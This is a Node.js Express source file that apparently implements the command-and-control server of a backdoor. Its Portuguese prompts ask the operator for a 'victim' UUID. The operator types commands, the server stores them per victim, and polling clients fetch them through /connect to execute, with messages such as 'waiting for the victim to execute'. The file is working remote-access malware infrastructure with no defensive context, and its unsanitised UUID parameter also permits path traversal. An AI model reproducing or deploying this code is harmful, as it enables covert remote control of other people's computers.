const express = require('express');
const app = express();
const router = express.Router();
const path = require('path')
const fs = require('fs');

const readline = require('readline').createInterface({
  input: process.stdin,
  output: process.stdout
});
var log = console.log;
console.log("test");

let date_ob = new Date();
let date = ("0" + date_ob.getDate()).slice(-2);
let month = ("0" + (date_ob.getMonth() + 1)).slice(-2);
let year = date_ob.getFullYear();
let hours = date_ob.getHours();
let minutes = date_ob.getMinutes();
let seconds = date_ob.getSeconds();

let tempo = year + "-" + month + "-" + date + " " + hours + ":" + minutes + ":" + seconds;

var cmdCheck = "nothing.koro";

router.get('/', function(req, res) {
  res.sendFile(path.join(__dirname, '/index.html'));
});
app.use('/', router);

router.get('/connect', function(req, res) {
  let vUUID = req.query.vuuid;
  if (fs.existsSync("./vuuid/" + vUUID + ".koro")) {
    const data = fs.readFileSync('./vuuid/' + vUUID + ".koro", {encoding:'utf8', flag:'r'});
    
    if(data == cmdCheck && data != "nothing.koro"){
      res.send(data);
      console.log("Comando " + cmdCheck + " Executado com Sucesso.")
      
      fs.writeFileSync("./vuuid/" + vUUID + ".koro", "nothing.koro");
      cmdCheck = "nothing.koro";
      cmdListener(vUUID);
    }else{
      res.send("Waiting...")
    }
  } else {
    fs.writeFileSync("./vuuid/" + vUUID + ".koro", "nothing.koro");
    res.send("OK");
  }
});
app.use('/connect', router);

//404 Error
app.use(function(req, res, next) {
  res.status(404);
  res.sendFile(__dirname + '/404.html');
});

let server = app.listen(3000, function() {
  console.log("App server is running on port 3000");
  console.log("to end press Ctrl + C");
  vListener();
});

var cmdListener = function (v) {
  readline.question(`@${v} ~ Command: `, function (answer) {
    if (answer == 'exit'){
      process.stdout.write('\033c');
      return vListener(); 
    } 

    if (answer == 'clear'){
      process.stdout.write('\033c');
      return cmdListener(v); 
    } 
      
    fs.writeFileSync("./vuuid/" + v + ".koro", answer);
    log('CMD:', answer, 'Injetado com sucesso."');
    cmdCheck = answer;
    log('Aguardando a Vitima Executar...')
    
  });
};

var vListener = function () {
  readline.question('Coloque o UUID da vitima: ', function (answer) {
    if (answer == 'exit'){
      return readline.close();
    } 
    
    if (answer == 'clear'){
      process.stdout.write('\033c');
      return vListener(); 
    } 
       
    if(fs.existsSync("./vuuid/" + answer + ".koro")){
      log('Tudo certo, Conectado com a vitima:', answer);
      cmdListener(answer); 
    }else{
      log('Vitima', answer, "Não encontrada.")
      vListener();
    }
    
    
  });
};




